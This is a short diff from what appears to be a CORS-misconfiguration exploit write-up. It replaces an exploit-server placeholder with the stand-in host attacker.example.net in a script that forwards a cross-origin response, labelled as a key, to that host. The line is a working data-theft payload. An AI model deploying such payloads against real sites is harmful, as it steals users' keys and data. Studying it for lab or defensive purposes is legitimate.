@@ -112,7 +112,7 @@ origin in the request:
   req.send();
 
   function reqListener() {
-    location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
+    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
    };
 </script>"></iframe> 
 ```
